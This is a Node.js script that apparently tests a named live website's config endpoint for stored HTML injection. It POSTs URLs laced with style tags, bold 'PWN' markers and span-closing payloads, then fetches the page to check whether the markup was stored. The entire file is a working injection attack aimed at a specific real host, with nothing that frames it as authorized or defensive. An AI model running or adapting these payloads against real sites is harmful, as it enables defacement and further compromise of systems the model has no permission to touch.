import { makeClient } from './lib.mjs';
import fs from 'fs';
const c = makeClient('https://tutorialinjectid.my.id');
const T = '/config/index.php?page=1';
const H = { 'content-type': 'application/x-www-form-urlencoded', accept: 'application/json, text/plain, */*', origin: 'https://tutorialinjectid.my.id', referer: 'https://tutorialinjectid.my.id/config/' };
const cases = {
  q_style: 'https://sfile.co/VCa4EJPMs7J?x=<style>body{background:#ff0044!important}</style>',
  frag_b: 'https://sfile.co/VCa4EJPMs7J#<b style="color:#0f0">PWN-HTML-INJECT</b>',
  close_span: 'https://sfile.co/VCa4EJPMs7J</span><u>PWN2</u><span>',
  amp_trick: 'https://sfile.co/VCa4EJPMs7J&bc=<b>PWN3</b>',
};
await c.get(T);
for (const [k, url] of Object.entries(cases)) {
  const body = new URLSearchParams({ action: 'process_download', config_url: url, config_title: 'x' }).toString();
  let r = await c.get(T, { method: 'POST', body, headers: H });
  console.log(`${k.padEnd(12)} -> ${r.status} ${r.body.replace(/\s+/g, ' ').slice(0, 200)}`);
}
const g = await c.get('/config/');
fs.writeFileSync('/tmp/opencode/config_after2.html', g.body);
const names = ['PWN-HTML-INJECT', 'PWN2', 'PWN3', 'background:#ff0044', '<style>body{background'];
console.log('\n--- cek mentah HTML ---');
for (const n of names) {
  const i = g.body.indexOf(n);
  console.log(String(i > 0).padEnd(6), n, i > 0 ? '| konteks: ' + g.body.slice(Math.max(0, i - 130), i + 90).replace(/\s+/g, ' ') : '');
}
